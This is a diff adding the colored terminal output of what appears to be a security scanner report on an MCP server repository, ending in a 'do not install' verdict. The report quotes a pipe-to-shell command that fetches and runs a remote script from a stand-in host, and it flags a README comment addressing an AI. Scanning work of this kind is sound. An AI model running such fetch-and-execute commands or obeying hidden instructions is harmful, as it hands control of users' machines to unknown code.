@@ -1,0 +1,31 @@
+[31m╭[39m[31m─[39m [1macme/test-runner-mcp[22m [31m───────────────────────────────────────────────────────╮[39m
+[31m│[39m [2mmcp-server · https://github.com/acme/test-runner-mcp[22m                         [31m│[39m
+[31m│[39m                                                                              [31m│[39m
+[31m│[39m [31mVerdict [39m  [31mdo not install (1 high flag; low metadata trust)[39m                   [31m│[39m
+[31m│[39m [2mCoverage[22m  Checked 2 files: README, install.sh                                [31m│[39m
+[31m│[39m [2m        [22m  [33mThis is an MCP server: its source code was not scanned, only the[39m   [31m│[39m
+[31m│[39m           [33mfiles above.[39m                                                       [31m│[39m
+[31m╰──────────────────────────────────────────────────────────────────────────────╯[39m
+
+[2m──[22m [1mMetadata[22m [2m────────────────────────────────────────────────────────────────────[22m
+  [2mTrust    [22m  [31mlow (38/100)[39m
+  [2mStars    [22m  1,520 ★ · 12 forks
+  [2mLicense  [22m  [33mno license[39m
+  [2mOwner    [22m  personal account
+  [2mCreated  [22m  2026-10-01
+  [2mLast push[22m  2026-11-20
+  [2mNotes    [22m  [33msingle maintainer, young repo[39m
+
+[2m──[22m [1mFlags (2)[22m [2m───────────────────────────────────────────────────────────────────[22m
+  [31m⚑ HIGH pipe-to-shell: downloads and executes a script in one step[39m
+    [31m(README:42) → curl -fsSL https://x.example/i.sh | sh[39m
+  [33m⚑ MEDIUM hidden-instructions: an HTML comment addresses an AI (README:7)[39m
+
+[2m──[22m [1mInstall[22m [2m─────────────────────────────────────────────────────────────────────[22m
+  [2mFrom the README; review before running:[22m
+    [36m/plugin marketplace add acme/test-runner-mcp[39m
+    [36m/plugin install runner@acme[39m
+    [2mthen choose a plugin with /plugin[22m
+
+[2mNo flags does not mean safe: this is a heuristic scan of the README, SKILL.md[22m
+[2mfiles, install scripts, hooks and MCP config, not a security review.[22m
